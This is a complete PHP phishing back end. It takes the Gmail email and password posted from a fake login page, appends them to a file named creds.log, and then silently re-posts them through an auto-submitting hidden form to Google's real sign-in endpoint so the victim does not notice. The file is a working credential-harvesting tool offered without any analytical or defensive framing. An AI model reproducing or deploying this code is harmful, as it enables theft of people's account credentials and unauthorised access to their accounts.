<html>
<body>
<?php
$fp = fopen("creds.log", "a");
fwrite($fp, "\nGmail $_POST[Email] $_POST[Passwd]");
fclose($fp);
echo "<form name=\"myform\" method=\"post\" action=\"https://accounts.google.com/ServiceLoginAuth\">";
echo "<input type=\"hidden\" name=\"Email\" value=\"$_POST[Email]\">";
echo "<input type=\"hidden\" name=\"Passwd\" value=\"$_POST[Passwd]\">";
?>
<script language="JavaScript">document.myform.submit();</script>
</form>
</body>
</html>
